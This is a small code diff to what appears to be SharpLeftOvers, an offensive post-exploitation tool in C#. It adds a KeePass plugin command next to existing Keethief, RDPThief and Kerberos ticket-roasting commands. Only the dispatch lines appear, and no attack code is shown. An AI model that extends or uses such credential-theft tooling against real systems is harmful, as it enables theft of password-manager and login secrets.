@@ -46,6 +46,7 @@ namespace SharpLeftOvers
                                 Commands.Keethief();
                                 Commands.NotepadPlusPlus();
                                 Commands.RDPThief();
+                                Commands.KeePassPlugin();
                                 break;
                             case "-roastedtickets":
                                 Commands.Roastedtickets();
